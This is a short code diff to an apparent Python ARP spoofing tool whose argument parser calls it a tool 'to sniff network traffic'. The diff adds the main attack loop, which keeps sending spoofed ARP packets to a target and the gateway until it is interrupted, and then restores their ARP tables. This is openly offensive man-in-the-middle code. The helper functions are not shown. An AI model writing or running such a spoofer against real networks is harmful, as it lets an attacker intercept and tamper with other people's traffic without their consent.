@@ -40,10 +40,16 @@ class ARPSpoofer:
     def run(self):
         # Starts ARP spoofing attack through continueous sending of spoofed packets
         # Upon interruption ARP table is restored (Ctrl+C)
-        print(Fore.RED + "[!] Detected cancelation. Restoring ARP tables... Be patient.")
-        self.restore(self.target_ip, self.spoof_ip)
-        self.restore(self.spoof_ip, self.target_ip)
-        print(Fore.GREEN + "[+] ARP tables restored.")
+        try:
+            while True:
+                self.spoof(self.target_ip, self.spoof_ip) # Spoof IP of target
+                self.spoof(self.spoof_ip, self.target_ip) # Spoofing the spoofed IP
+        except KeyboardInterrupt:
+            print(Fore.RED + "[!] Detected cancellation. Restoring APR tables... Please be patient")
+            self.restore(self.target_ip, self.spoof_ip)
+            self.restore(self.spoof_ip, self.target_ip)
+            print(Fore.GREEN + "[+] ARP tables restored.")
+            
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="ARP Spoofing Tool to sniff network traffic.")
